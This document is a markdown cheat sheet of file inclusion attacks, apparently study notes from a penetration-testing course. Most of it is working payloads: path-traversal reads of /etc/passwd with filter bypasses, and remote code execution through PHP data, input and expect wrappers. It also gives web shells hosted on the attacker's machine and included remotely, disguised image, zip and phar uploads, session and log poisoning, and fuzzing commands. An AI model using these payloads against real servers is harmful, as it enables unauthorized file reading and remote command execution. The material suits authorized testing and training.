# File Inclusion

## Local File Inclusion

- Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows.
- If we find files on the web server (.php files for example), that return other status codes than 200 when fuzzing, these can still be viewed with LFI, so should not be ignored.
- If files get rendered during LFI we can encode them first, then decode to read the source code.
- If the web serrver adds a file extension like .php we do not need to add it when trying to LFI index.php, for example, to read the source code.

| Command | Description |
|---------|-------------|
| **Basic LFI** | |
| `/index.php?language=/etc/passwd` | Basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
| **LFI Bypasses** | |
| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |

### Second order attacks

Setting user names to `../../../../etc/passwd`, for example, could result in the LFI elsewhere the username is used.

### Checking PHP Configurations

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" 
# 7.4 should be whatever php version is in use
# /etc/php/X.Y/apache2/php.ini for Apache or /etc/php/X.Y/fpm/php.ini for nginx
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
# check for value of allow_url_include (not enabled by default)
# allow_url_include required to be on for use of various wrappers, including the data and input wrappers
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
# check for except extension
python3 -c 'import urllib.parse;print(urllib.parse.quote_plus("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
# URL encoding for get requests
```

## Remote Code Execution

| Command | Description |
|---------|-------------|
| **[PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php)** | |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with `data` wrapper (only available to use if the `allow_url_include` setting is enabled in the PHP configurations), base64 encoded `'<?php system($_GET["cmd"]); ?>'`, prepend with `curl -s 'http://<SERVER_IP>:<PORT>` to preform with curl in command prompt |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
| **RFI** | |
| `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php` | Start by trying to include a local string, see if included as source code or executed as php etc **NOTE** Including the page itself (i.e. index.php) could cause a recursive loop DOS |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell, inspect received connection, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload |
| `sudo python -m pyftpdlib -p 21` | Hosting file through ftp instead |
| `impacket-smbserver -smb2support share $(pwd)` | Hosting file through SMB for windows servers, then use `http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami` (more likely to work if we were on the same network) |
| **LFI + Upload** | |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |
| [LFI to RCE via PHPInfo](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html) | Obsolete method |
| **Log Poisoning** | |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
| `/index.php?language=session_poisoning` | Test if session poisoning possible |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `/index.php?language=/var/log/apache2/access.log` | Check if access logs available (error.log another common option), Once confirmed try changing user agent in burp and see if it is displayed |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log by setting user agent |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |

**NOTE** PHPSESSID is saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.

**NOTE** By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. If not default could use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

**Tip** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

**Tip** The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Other possibly readable logs:
- /var/log/sshd.log
- /var/log/mail
- /var/log/vsftpd.log


**TIP** Using curl for RFI

```bash
curl -w "\n" -s 'http://10.129.29.114/index.php?language=http://10.10.14.202:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"
# curl flags:
#   -w "\n": Append newline
#   -s: Silent mode
# grep flags:
#   -v: Invert match (exclude matching lines)
#   <.*>: Regex for lines containing HTML tags
``` 

## Misc

**[PHP filters](https://www.php.net/manual/en/filters.php)**
- [String Filters](https://www.php.net/manual/en/filters.string.php)
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)

| Command | Description |
|---------|-------------|
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` | Fuzz for PHP files |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |

## LFI Wordlists

- [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
- [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
- [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
- [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
- [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
- [Popular LFI parameters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
- [LFI wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

## LFI tools

- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
- [liffy](https://github.com/mzfr/liffy)

## File Inclusion Functions

| Function | Read Content | Execute | Remote URL |
|----------|--------------|---------|------------|
| **PHP** | | | |
| `include()/include_once()` | Yes | Yes | Yes |
| `require()/require_once()` | Yes | Yes | No |
| `file_get_contents()` | Yes | No | Yes |
| `fopen()/file()` | Yes | No | No |
| **NodeJS** | | | |
| `fs.readFile()` | Yes | No | No |
| `fs.sendFile()` | Yes | No | No |
| `res.render()` | Yes | Yes | No |
| **Java** | | | |
| `include` | Yes | No | No |
| `import` | Yes | Yes | Yes |
| **.NET** | | | |
| `@Html.Partial()` | Yes | No | No |
| `@Html.RemotePartial()` | Yes | No | Yes |
| `Response.WriteFile()` | Yes | No | No |
| `include` | Yes | Yes | Yes |